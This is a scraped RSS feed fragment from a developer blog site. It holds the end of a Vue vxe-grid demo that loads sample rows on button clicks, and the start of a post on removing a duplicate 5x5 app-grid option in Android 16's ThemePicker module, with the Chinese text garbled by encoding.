  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">vxe-button</span> <span class="hljs-attr">status</span>=<span class="hljs-string">"primary"</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"loadList1Event"</span>&gt;</span>ä¿®æ”¹1<span class="hljs-tag">&lt;/<span class="hljs-name">vxe-button</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">vxe-button</span> <span class="hljs-attr">status</span>=<span class="hljs-string">"primary"</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"loadList2Event"</span>&gt;</span>ä¿®æ”¹2<span class="hljs-tag">&lt;/<span class="hljs-name">vxe-button</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">vxe-button</span> <span class="hljs-attr">status</span>=<span class="hljs-string">"primary"</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"loadList3Event"</span>&gt;</span>ä¿®æ”¹3<span class="hljs-tag">&lt;/<span class="hljs-name">vxe-button</span>&gt;</span>

    <span class="hljs-tag">&lt;<span class="hljs-name">vxe-grid</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">"gridRef"</span> <span class="hljs-attr">v-bind</span>=<span class="hljs-string">"gridOptions"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">vxe-grid</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { ref, reactive } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>

<span class="hljs-keyword">const</span> gridRef = <span class="hljs-title function_">ref</span>()

<span class="hljs-keyword">const</span> gridOptions = <span class="hljs-title function_">reactive</span>({
  <span class="hljs-attr">border</span>: <span class="hljs-literal">true</span>,
  <span class="hljs-attr">height</span>: <span class="hljs-number">300</span>,
  <span class="hljs-attr">columns</span>: [
    { <span class="hljs-attr">type</span>: <span class="hljs-string">'seq'</span>, <span class="hljs-attr">width</span>: <span class="hljs-number">70</span> },
    { <span class="hljs-attr">field</span>: <span class="hljs-string">'name'</span>, <span class="hljs-attr">title</span>: <span class="hljs-string">'Name'</span> },
    { <span class="hljs-attr">field</span>: <span class="hljs-string">'sex'</span>, <span class="hljs-attr">title</span>: <span class="hljs-string">'Sex'</span> },
    { <span class="hljs-attr">field</span>: <span class="hljs-string">'age'</span>, <span class="hljs-attr">title</span>: <span class="hljs-string">'Age'</span> },
    { <span class="hljs-attr">field</span>: <span class="hljs-string">'address'</span>, <span class="hljs-attr">title</span>: <span class="hljs-string">'Address'</span>, <span class="hljs-attr">showOverflow</span>: <span class="hljs-literal">true</span> }
  ],
  <span class="hljs-attr">data</span>: []
})

<span class="hljs-keyword">const</span> <span class="hljs-title function_">loadList1Event</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">const</span> $grid = gridRef.<span class="hljs-property">value</span>
  <span class="hljs-keyword">if</span> ($grid) {
    $grid.<span class="hljs-title function_">loadData</span>([
      { <span class="hljs-attr">id</span>: <span class="hljs-number">10008</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test8'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Develop'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Man'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">35</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
      { <span class="hljs-attr">id</span>: <span class="hljs-number">10009</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test9'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Test'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Man'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">26</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
      { <span class="hljs-attr">id</span>: <span class="hljs-number">10010</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test10'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Develop'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Man'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">38</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
      { <span class="hljs-attr">id</span>: <span class="hljs-number">10011</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test11'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Test'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Women'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">29</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
      { <span class="hljs-attr">id</span>: <span class="hljs-number">10012</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test12'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Develop'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Man'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">27</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> }
    ])
  }
}

<span class="hljs-keyword">const</span> <span class="hljs-title function_">loadList2Event</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">const</span> $grid = gridRef.<span class="hljs-property">value</span>
  <span class="hljs-keyword">if</span> ($grid) {
    $grid.<span class="hljs-title function_">loadData</span>([
      { <span class="hljs-attr">id</span>: <span class="hljs-number">10003</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test3'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'PM'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Man'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">32</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'Shanghai'</span> },
      { <span class="hljs-attr">id</span>: <span class="hljs-number">10004</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test4'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Designer'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Women'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">23</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
      { <span class="hljs-attr">id</span>: <span class="hljs-number">10005</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test5'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Develop'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Women'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">30</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'Shanghai'</span> },
      { <span class="hljs-attr">id</span>: <span class="hljs-number">10006</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test6'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Designer'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Women'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">21</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
      { <span class="hljs-attr">id</span>: <span class="hljs-number">10007</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test7'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Test'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Man'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">29</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
      { <span class="hljs-attr">id</span>: <span class="hljs-number">10008</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test8'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Develop'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Man'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">35</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
      { <span class="hljs-attr">id</span>: <span class="hljs-number">10009</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test9'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Test'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Man'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">26</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
      { <span class="hljs-attr">id</span>: <span class="hljs-number">10010</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test10'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Develop'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Man'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">38</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
      { <span class="hljs-attr">id</span>: <span class="hljs-number">10011</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test11'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Test'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Women'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">29</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
      { <span class="hljs-attr">id</span>: <span class="hljs-number">10012</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test12'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Develop'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Man'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">27</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
      { <span class="hljs-attr">id</span>: <span class="hljs-number">10013</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test13'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Test'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Women'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">24</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
      { <span class="hljs-attr">id</span>: <span class="hljs-number">10014</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test14'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Develop'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Man'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">34</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> }
    ])
  }
}

<span class="hljs-keyword">const</span> <span class="hljs-title function_">loadList3Event</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">const</span> $grid = gridRef.<span class="hljs-property">value</span>
  <span class="hljs-keyword">if</span> ($grid) {
    $grid.<span class="hljs-title function_">loadData</span>([
      { <span class="hljs-attr">id</span>: <span class="hljs-number">10001</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test1'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Develop'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Man'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">28</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
      { <span class="hljs-attr">id</span>: <span class="hljs-number">10002</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test2'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Test'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Women'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">22</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'Guangzhou'</span> },
      { <span class="hljs-attr">id</span>: <span class="hljs-number">10003</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test3'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'PM'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Man'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">32</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'Shanghai'</span> },
      { <span class="hljs-attr">id</span>: <span class="hljs-number">10004</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test4'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Designer'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Women'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">23</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
      { <span class="hljs-attr">id</span>: <span class="hljs-number">10005</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test5'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Develop'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Women'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">30</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'Shanghai'</span> },
      { <span class="hljs-attr">id</span>: <span class="hljs-number">10006</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test6'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Designer'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Women'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">21</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
      { <span class="hljs-attr">id</span>: <span class="hljs-number">10007</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test7'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Test'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Man'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">29</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
      { <span class="hljs-attr">id</span>: <span class="hljs-number">10008</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test8'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Develop'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Man'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">35</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
      { <span class="hljs-attr">id</span>: <span class="hljs-number">10009</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test9'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Test'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Man'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">26</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
      { <span class="hljs-attr">id</span>: <span class="hljs-number">10010</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test10'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Develop'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Man'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">38</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
      { <span class="hljs-attr">id</span>: <span class="hljs-number">10011</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test11'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Test'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Women'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">29</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
      { <span class="hljs-attr">id</span>: <span class="hljs-number">10012</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test12'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Develop'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Man'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">27</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
      { <span class="hljs-attr">id</span>: <span class="hljs-number">10013</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test13'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Test'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Women'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">24</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
      { <span class="hljs-attr">id</span>: <span class="hljs-number">10014</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test14'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Develop'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Man'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">34</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
      { <span class="hljs-attr">id</span>: <span class="hljs-number">10015</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test15'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Test'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Man'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">21</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
      { <span class="hljs-attr">id</span>: <span class="hljs-number">10016</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test16'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Develop'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Women'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">20</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
      { <span class="hljs-attr">id</span>: <span class="hljs-number">10017</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test17'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Test'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Man'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">31</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
      { <span class="hljs-attr">id</span>: <span class="hljs-number">10018</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test18'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Develop'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Women'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">32</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
      { <span class="hljs-attr">id</span>: <span class="hljs-number">10019</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test19'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Test'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Man'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">37</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
      { <span class="hljs-attr">id</span>: <span class="hljs-number">10020</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test20'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Develop'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Man'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">41</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> }
    ])
  }
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å®‰å“16 è®¾ç½®å£çº¸ä¸­åº”ç”¨ç½‘æ ¼ï¼Œæœ‰ä¸¤ä¸ª5X5çš„é€‰é¡¹]]></title>    <link>https://juejin.cn/post/7592805973120679942</link>    <guid>https://juejin.cn/post/7592805973120679942</guid>    <pubDate>2026-01-08T09:50:10.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592805973120679942" data-draft-id="7592572266754670655" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å®‰å“16 è®¾ç½®å£çº¸ä¸­åº”ç”¨ç½‘æ ¼ï¼Œæœ‰ä¸¤ä¸ª5X5çš„é€‰é¡¹"/> <meta itemprop="keywords" content="Android"/> <meta itemprop="datePublished" content="2026-01-08T09:50:10.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="robotx"/> <meta itemprop="url" content="https://juejin.cn/user/3817944287025453"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å®‰å“16 è®¾ç½®å£çº¸ä¸­åº”ç”¨ç½‘æ ¼ï¼Œæœ‰ä¸¤ä¸ª5X5çš„é€‰é¡¹
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3817944287025453/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    robotx
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T09:50:10.000Z" title="Thu Jan 08 2026 09:50:10 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å¤ç°æ­¥éª¤</h2>
<pre><code class="hljs">è®¾ç½®Â -Â å£çº¸Â -Â å£çº¸ä¸é£æ ¼Â -Â ä¸»å±å¹•Â -Â åº”ç”¨ç½‘æ ¼ï¼Œå‘ç°æœ‰ä¸¤ä¸ª5X5çš„é€‰é¡¹
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/65385692e0624b5c98d9ca59ee9dd6c8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgcm9ib3R4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768470609&amp;x-signature=H9s6VWsIIWY0oo4Xvp8EfE3beso%3D" alt="ä¼ä¸šå¾®ä¿¡æˆªå›¾_1767689307310.png" loading="lazy"/>
è¦åšçš„å°±æ˜¯å»æ‰ä¸€ä¸ª5x5</p>
<h2 data-id="heading-1">è§£å†³</h2>
<h3 data-id="heading-2"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9df3139fd22147cfb32f492c4fea8aca~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgcm9ib3R4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768470609&amp;x-signature=l%2FKfE3HEw0aS09YYgRN%2FtuygGT4%3D" alt="ä¸€çº§" loading="lazy"/>
æœç´¢å…³é”®è¯<code>åº”ç”¨ç½‘æ ¼</code>ï¼Œå‘ç°ä¸æ˜¯åœ¨Settingä¸­ï¼Œè€Œæ˜¯åœ¨<code>ThemePicker</code>æ¨¡å—ä¸‹ï¼Œåç»­æ›´æ”¹å‡åœ¨<code>ThemePicker</code>æ¨¡å—ã€‚
<code>æ¨¡å—è·¯å¾„ï¼špackages/apps/ThemePicker</code>ã€‚</h3>
<p>æ ¹æ®<code>åº”ç”¨ç½‘æ ¼</code>å®šä½:</p>
<pre><code class="hljs language-xml" lang="xml">strings.xml

<span class="hljs-tag">&lt;<span class="hljs-name">string</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"grid_title"</span> <span class="hljs-attr">msgid</span>=<span class="hljs-string">"1688173478777254123"</span>&gt;</span>"åº”ç”¨ç½‘æ ¼"<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span>
</code></pre>
<hr/>
